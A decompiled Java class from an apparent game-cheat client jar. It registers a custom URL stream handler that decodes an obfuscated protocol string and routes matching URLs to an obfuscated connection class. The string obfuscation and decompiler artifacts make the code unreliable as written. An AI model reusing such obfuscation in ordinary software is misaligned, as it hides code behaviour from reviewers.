package kfp.hdl;

import java.io.IOException;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;

public class Handler extends URLStreamHandler {
  protected URLConnection openConnection(URL paramURL) throws IOException {
    "㉰집䬿畍".toCharArray()[0] = (char)("㉰집䬿畍".toCharArray()[0] ^ 0x7E77);
    if (paramURL.getProtocol().equals(i.L("㉰집䬿畍".toCharArray(), (short)5118, 2, (short)5))) {
      URL uRL = new URL(paramURL.toString().substring(4));
      return new qs(uRL);
    } 
    return paramURL.openConnection();
  }
}


/* Location:              C:\Users\SamzyDev\Desktop\OringoClient_Suporter-1.7.1.jar!\kfp\hdl\Handler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       1.1.3
 */